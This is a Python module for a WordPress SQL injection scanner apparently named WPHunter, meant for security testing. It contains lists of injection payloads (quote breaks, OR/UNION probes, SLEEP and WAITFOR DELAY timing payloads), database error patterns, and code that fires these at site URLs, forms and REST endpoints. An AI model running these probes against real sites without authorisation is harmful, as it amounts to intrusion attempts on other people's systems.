"""
WPHunter - SQL Injection Scanner
================================
SQL Injection vulnerability detection for WordPress.

Vulnerability Types:
- Classic SQLi (error-based)
- Blind SQLi (boolean-based)
- Time-based SQLi

OWASP: A1:2017 - Injection
CWE-89: Improper Neutralization of Special Elements in SQL Command
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from core.http_client import WPHttpClient, HTTPResponse
from core.logger import logger


class SQLiType(Enum):
    """Type of SQL injection."""
    ERROR_BASED = "error_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BLIND = "time_blind"
    UNION_BASED = "union_based"


@dataclass
class SQLiFinding:
    """SQL injection vulnerability finding."""
    url: str
    parameter: str
    payload: str
    sqli_type: SQLiType
    evidence: str
    dbms: Optional[str] = None
    severity: str = "critical"
    
    # CWE/OWASP mapping
    cwe: str = "CWE-89"
    owasp: str = "A1:2017"
    
    def to_dict(self) -> Dict:
        return {
            "type": "SQL Injection",
            "subtype": self.sqli_type.value,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence[:500],
            "dbms": self.dbms,
            "severity": self.severity,
            "cwe": self.cwe,
            "owasp": self.owasp,
        }


class SQLiScanner:
    """
    WordPress SQL Injection vulnerability scanner.
    
    Uses multiple detection techniques:
    - Error-based: Triggers SQL errors visible in response
    - Boolean-blind: Detects differences in response based on true/false conditions
    - Time-blind: Uses SLEEP() to detect SQLi via response time
    
    WordPress-specific:
    - Targets $wpdb query patterns
    - Tests common vulnerable parameters
    - Respects WordPress escaping patterns
    """
    
    # Error patterns indicating SQL injection
    SQL_ERRORS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark",
            r"You have an error in your SQL syntax",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"SQLITE_ERROR",
            r"SQLite3::SQLException",
        ],
        "oracle": [
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"quoted string not properly terminated",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark after the character string",
        ],
    }
    
    # Payloads for different detection methods
    PAYLOADS = {
        "error_based": [
            "'",                           # Simple quote break
            "\"",                          # Double quote break
            "' OR '1'='1",                 # Classic OR injection
            "\" OR \"1\"=\"1",             
            "' OR '1'='1'--",              # With comment
            "1' AND '1'='1",               # AND injection
            "1 UNION SELECT NULL--",       # UNION probe
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",             # Column enumeration
            "1' AND 1=CONVERT(int,(SELECT @@version))--",  # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
        ],
        "boolean_blind": [
            ("' AND '1'='1", "' AND '1'='2"),      # True/False pair
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
            (" AND 1=1", " AND 1=2"),
            ("' AND 1=1--", "' AND 1=2--"),
        ],
        "time_blind": {
            "mysql": "' AND SLEEP(5)--",
            "postgresql": "'; SELECT pg_sleep(5);--",
            "mssql": "'; WAITFOR DELAY '0:0:5';--",
            "oracle": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        },
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        ],
    }
    
    # WordPress-specific injection points
    WP_INJECTION_POINTS = [
        # Search
        ("/?s=", "s"),
        # Author
        ("/?author=", "author"),
        # Post/Page ID
        ("/?p=", "p"),
        ("/?page_id=", "page_id"),
        # Category/Tag
        ("/?cat=", "cat"),
        ("/?tag=", "tag"),
        # Feed
        ("/feed/?cat=", "cat"),
        # REST API
        ("/wp-json/wp/v2/posts?per_page=", "per_page"),
        ("/wp-json/wp/v2/users?per_page=", "per_page"),
    ]
    
    def __init__(
        self,
        http_client: WPHttpClient,
        time_delay: int = 5,
        use_sqlmap: bool = False
    ):
        self.http = http_client
        self.time_delay = time_delay
        self.use_sqlmap = use_sqlmap
        self.findings: List[SQLiFinding] = []
        self.tested_params: set = set()
    
    async def scan(
        self,
        urls: Optional[List[str]] = None,
        forms: Optional[List[Dict]] = None,
    ) -> List[SQLiFinding]:
        """
        Scan for SQL injection vulnerabilities.
        
        Args:
            urls: URLs with parameters to test
            forms: Form endpoints to test
            
        Returns:
            List of SQLi findings
        """
        logger.section("SQL Injection Scan")
        
        # Test WordPress-specific injection points
        await self._scan_wp_endpoints()
        
        # Test provided URLs
        if urls:
            for url in urls:
                await self._scan_url_params(url)
        
        # Test forms
        if forms:
            for form in forms:
                await self._scan_form(form)
        
        # Summary
        if self.findings:
            logger.vuln("critical", f"Found {len(self.findings)} SQL injection vulnerabilities")
        else:
            logger.success("No SQL injection vulnerabilities found")
        
        return self.findings
    
    async def _scan_url_params(self, url: str):
        """
        Scan URL parameters for SQL injection.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name in params.keys():
            param_key = f"{url}:{param_name}"
            if param_key in self.tested_params:
                continue
            self.tested_params.add(param_key)
            
            # Phase 1: Error-based detection
            found = await self._test_error_based(url, param_name)
            if found:
                continue
            
            # Phase 2: Boolean-blind detection
            found = await self._test_boolean_blind(url, param_name)
            if found:
                continue
            
            # Phase 3: Time-blind detection (last resort, slow)
            await self._test_time_blind(url, param_name)
    
    async def _test_error_based(self, url: str, param_name: str) -> bool:
        """
        Test for error-based SQL injection.
        
        Looks for SQL error messages in response.
        """
        for payload in self.PAYLOADS["error_based"][:6]:  # Limit payloads
            test_url = self._inject_param(url, param_name, f"1{payload}")
            
            try:
                response = await self.http.get(test_url)
                
                if not response.ok:
                    continue
                
                # Check for SQL errors
                dbms, error = self._detect_sql_error(response.text)
                
                if dbms:
                    finding = SQLiFinding(
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        sqli_type=SQLiType.ERROR_BASED,
                        evidence=error,
                        dbms=dbms,
                    )
                    self.findings.append(finding)
                    logger.vuln("critical", f"SQL Injection ({dbms}) in {param_name}")
                    return True
                    
            except Exception as e:
                logger.debug(f"Error-based test failed: {e}")
        
        return False
    
    async def _test_boolean_blind(self, url: str, param_name: str) -> bool:
        """
        Test for boolean-based blind SQL injection.
        
        Compares responses between true/false conditions.
        """
        # Get baseline response
        try:
            baseline = await self.http.get(url)
            baseline_length = len(baseline.text)
        except Exception:
            return False
        
        for true_payload, false_payload in self.PAYLOADS["boolean_blind"]:
            try:
                # Test true condition
                true_url = self._inject_param(url, param_name, f"1{true_payload}")
                true_response = await self.http.get(true_url)
                
                # Test false condition
                false_url = self._inject_param(url, param_name, f"1{false_payload}")
                false_response = await self.http.get(false_url)
                
                # Compare responses
                true_length = len(true_response.text)
                false_length = len(false_response.text)
                
                # Significant difference suggests boolean SQLi
                length_diff = abs(true_length - false_length)
                if length_diff > 100 and length_diff > baseline_length * 0.1:
                    # Verify with another test
                    verify_url = self._inject_param(url, param_name, f"1{true_payload}")
                    verify_response = await self.http.get(verify_url)
                    
                    if abs(len(verify_response.text) - true_length) < 50:
                        finding = SQLiFinding(
                            url=url,
                            parameter=param_name,
                            payload=true_payload,
                            sqli_type=SQLiType.BOOLEAN_BLIND,
                            evidence=f"Response length diff: {length_diff} bytes",
                        )
                        self.findings.append(finding)
                        logger.vuln("critical", f"Blind SQL Injection in {param_name}")
                        return True
                        
            except Exception as e:
                logger.debug(f"Boolean-blind test failed: {e}")
        
        return False
    
    async def _test_time_blind(self, url: str, param_name: str) -> bool:
        """
        Test for time-based blind SQL injection.
        
        Uses SLEEP() function to detect SQLi via response timing.
        """
        # Test each DBMS-specific payload
        for dbms, payload in self.PAYLOADS["time_blind"].items():
            test_url = self._inject_param(url, param_name, f"1{payload}")
            
            try:
                start_time = time.monotonic()
                response = await self.http.get(test_url)
                elapsed = time.monotonic() - start_time
                
                # Check if response was delayed
                if elapsed >= self.time_delay - 1:  # Allow 1 second tolerance
                    # Verify it's not just a slow server
                    baseline_start = time.monotonic()
                    await self.http.get(url)
                    baseline_elapsed = time.monotonic() - baseline_start
                    
                    if elapsed > baseline_elapsed + self.time_delay - 2:
                        finding = SQLiFinding(
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            sqli_type=SQLiType.TIME_BLIND,
                            evidence=f"Response delayed by {elapsed:.1f}s (expected {self.time_delay}s)",
                            dbms=dbms,
                        )
                        self.findings.append(finding)
                        logger.vuln("critical", f"Time-based SQL Injection ({dbms}) in {param_name}")
                        return True
                        
            except Exception as e:
                logger.debug(f"Time-blind test failed: {e}")
        
        return False
    
    async def _scan_wp_endpoints(self):
        """
        Scan WordPress-specific endpoints for SQL injection.
        """
        logger.info("Testing WordPress-specific injection points...")
        
        for endpoint, param in self.WP_INJECTION_POINTS:
            param_key = f"wp:{endpoint}:{param}"
            if param_key in self.tested_params:
                continue
            self.tested_params.add(param_key)
            
            # Quick error-based test
            for payload in ["'", "\" OR 1=1--"]:
                test_url = f"{endpoint}{payload}"
                
                try:
                    response = await self.http.get(test_url)
                    
                    if response.ok:
                        dbms, error = self._detect_sql_error(response.text)
                        
                        if dbms:
                            finding = SQLiFinding(
                                url=endpoint,
                                parameter=param,
                                payload=payload,
                                sqli_type=SQLiType.ERROR_BASED,
                                evidence=error,
                                dbms=dbms,
                            )
                            self.findings.append(finding)
                            logger.vuln("critical", f"SQL Injection in WP endpoint {endpoint}")
                            break
                            
                except Exception:
                    continue
    
    async def _scan_form(self, form: Dict):
        """
        Scan form inputs for SQL injection.
        """
        action = form.get("action", "")
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])
        
        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            
            # Skip known safe parameters
            if name.lower() in ["_wpnonce", "nonce", "_wp_http_referer"]:
                continue
            
            form_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
            
            # Test with error-based payloads
            for payload in ["'", "' OR '1'='1"]:
                form_data[name] = payload
                
                try:
                    if method == "POST":
                        response = await self.http.post(action, data=form_data)
                    else:
                        response = await self.http.get(action, params=form_data)
                    
                    if response.ok:
                        dbms, error = self._detect_sql_error(response.text)
                        
                        if dbms:
                            finding = SQLiFinding(
                                url=action,
                                parameter=name,
                                payload=payload,
                                sqli_type=SQLiType.ERROR_BASED,
                                evidence=error,
                                dbms=dbms,
                            )
                            self.findings.append(finding)
                            logger.vuln("critical", f"SQL Injection in form field {name}")
                            break
                            
                except Exception:
                    continue
    
    def _detect_sql_error(self, content: str) -> Tuple[Optional[str], str]:
        """
        Detect SQL error messages in response content.
        
        Returns:
            Tuple of (database type, error message) or (None, "")
        """
        for dbms, patterns in self.SQL_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return dbms, match.group(0)
        
        return None, ""
    
    def _inject_param(self, url: str, param_name: str, value: str) -> str:
        """
        Inject a value into a URL parameter.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        params[param_name] = [value]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def get_summary(self) -> Dict:
        """Get scan summary."""
        return {
            "total_findings": len(self.findings),
            "by_type": {
                "error_based": len([f for f in self.findings if f.sqli_type == SQLiType.ERROR_BASED]),
                "boolean_blind": len([f for f in self.findings if f.sqli_type == SQLiType.BOOLEAN_BLIND]),
                "time_blind": len([f for f in self.findings if f.sqli_type == SQLiType.TIME_BLIND]),
            },
            "dbms_detected": list(set(f.dbms for f in self.findings if f.dbms)),
            "findings": [f.to_dict() for f in self.findings],
        }
